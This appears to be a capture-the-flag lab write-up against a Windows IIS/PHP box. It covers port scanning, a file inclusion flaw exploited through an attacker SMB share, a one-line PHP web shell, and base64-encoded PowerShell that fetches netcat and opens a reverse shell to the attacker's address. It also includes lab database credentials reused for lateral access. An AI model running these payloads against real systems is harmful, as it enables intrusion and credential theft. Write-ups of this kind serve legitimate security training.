#LFI #RFI #SMB #Powershell
# masscan results
```shell
sudo masscan -p1-65535 $IP --rate 1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-11-02 11:03:21 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.129.229.6                                    
Discovered open port 139/tcp on 10.129.229.6                                   
Discovered open port 135/tcp on 10.129.229.6                                   
Discovered open port 445/tcp on 10.129.229.6                                   
Discovered open port 49667/tcp on 10.129.229.6   
```

# nmap scan result

```shell
# Nmap 7.94SVN scan initiated Sat Nov  2 06:10:04 2024 as: nmap -sC -sV -oN nmap/snipe -T5 --min-rate=1000 -p- 10.129.229.6
Nmap scan report for 10.129.229.6
Host is up (0.22s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-02T18:13:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  2 06:13:54 2024 -- 1 IP address (1 host up) scanned in 230.28 seconds

```

webserver OS and PHP version

```shell
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.1
```

# Found LFI vulnerability on http://10.129.229.6/blog/?lang=blog-es.php that can execute arbitrary remote code using SMB server


# Created an smb server

> modified the /etc/samba/smb.conf

```shell
[<share_name>]
read only = yes
path=/srv/smb/
guest ok = yes
comment = "TEST"
browseable = yes
```


> encountered an error upon setting the smb path inside the user's home directory, 
> user login credentials needed for it be accessed on the SMB server
> had to configure it on the root directory /srv/smb so there would be no errors

```shell
sudo systemctl restart smb
```

> restarted the smb service running on the machine to apply changes on the configuration

# file.php
```php
<?php
exec($_REQUEST['cmd'])
?>
```
# included the smb server on the webpage using the lang parameter

```
http://10.129.229.6/blog/?lang=\\10.10.14.84\share\file.php&parameter=cmd
```

> can also used a POST request for the same endpoint, just had to add Content-Type header with a value of application/x-www-form-urlencoded


```shell
cmd=powershell+/enc+SQBXAFIAIABcAFwAMQAwAC4AMQAwAC4AMQA0AC4AOAA0AFwAZQB4AHAAbABvAGkAdABcAG4AYwA2ADQALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAEUATQBQAFwAbgBjAC4AZQB4AGUACgA=
```

> the command above downloads netcat file from the smb server, it uses IWR 


```shell
cmd=powershell+/enc+QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAAXABuAGMALgBlAHgAZQAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAxADAALgAxADAALgAxADQALgA4ADQAIAA0ADQANAA0AAoA
```

> executes nc.exe from C:/Windows/Temp/nc.exe

```shell
 mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");

```

> found credentials from db.php

# Used the credentials on the machine 

```powershell
PS C:\inetpub\wwwroot\blog> $user = "sniper\\chris"
$user = "sniper\\chris"

PS C:\inetpub\wwwroot\blog> $pass = "36mEAhz/B8xQ~2VM" 
$pass = "36mEAhz/B8xQ~2VM" 
PS C:\inetpub\wwwroot\blog> $secpass = ConvertTo-SecureString $pass -AsPlainText -Force
$secpass = ConvertTo-SecureString $pass -AsPlainText -Force
PS C:\inetpub\wwwroot\blog> $creds = New-Object System.Management.Automation.PSCredential ($user, $secpass)
$creds = New-Object System.Management.Automation.PSCredential ($user, $secpass)
PS C:\inetpub\wwwroot\blog> invoke-command -Credential $creds -Computer localhost -ScriptBlock {whoami}
invoke-command -Credential $creds -Computer localhost -ScriptBlock {whoami}
sniper\chris

```

> -Computer Localhost -ComputerName <hostname>